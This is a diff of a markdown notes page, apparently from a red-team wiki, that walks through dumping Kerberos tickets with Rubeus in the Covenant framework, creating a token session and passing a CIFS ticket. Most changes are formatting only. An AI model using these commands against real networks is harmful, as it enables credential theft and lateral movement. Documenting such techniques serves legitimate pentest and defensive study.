@@ -6,61 +6,60 @@
 
 #### - Show all session tickets
 
-```text
+```
 Rubeus triage
 ```
 
-![](../../../../.gitbook/assets/image%20%283%29.png)
+![](<../../../../.gitbook/assets/image (3).png>)
 
 #### - Dump the tickets
 
-```text
+```
 Rubeus dump
 ```
 
-![](../../../../.gitbook/assets/image%20%28103%29.png)
+![](<../../../../.gitbook/assets/image (103).png>)
 
 #### Loot are available in Data pane:
 
-![](../../../../.gitbook/assets/image%20%28275%29.png)
+![](<../../../../.gitbook/assets/image (275).png>)
 
-#### Copy the base64 ticket \(bug from data interface, copy the interactive window\)
+#### Copy the base64 ticket (bug from data interface, copy the interactive window)
 
-![](../../../../.gitbook/assets/image%20%28311%29.png)
+![](<../../../../.gitbook/assets/image (311).png>)
 
 #### Create a new session using MakeToken
 
-```text
+```
 MakeToken help
 
 [!] Usage: MakeToken <username> <domain> <password>[ <logontype> ]
 ```
 
-![](../../../../.gitbook/assets/image%20%28272%29.png)
+![](<../../../../.gitbook/assets/image (272).png>)
 
-#### Create a new grunt session 
+#### Create a new grunt session&#x20;
 
-```text
+```
 CreateProcessWithToken
 
 [!] Usage: CreateProcessWithToken <command>[ <path> ]
 ```
 
-![](../../../../.gitbook/assets/image%20%28101%29.png)
+![](<../../../../.gitbook/assets/image (101).png>)
 
 #### Pass the ticket
 
-```text
+```
 rubeus ptt /ticket:
 ```
 
-![](../../../../.gitbook/assets/image%20%28260%29.png)
+![](<../../../../.gitbook/assets/image (260).png>)
 
-![](../../../../.gitbook/assets/image.png)
+![](<../../../../.gitbook/assets/image (1).png>)
 
-#### cifs ticket injected 
+#### cifs ticket injected&#x20;
 
-![](../../../../.gitbook/assets/image%20%28126%29.png)
+![](<../../../../.gitbook/assets/image (126).png>)
 
-### 
-
+###
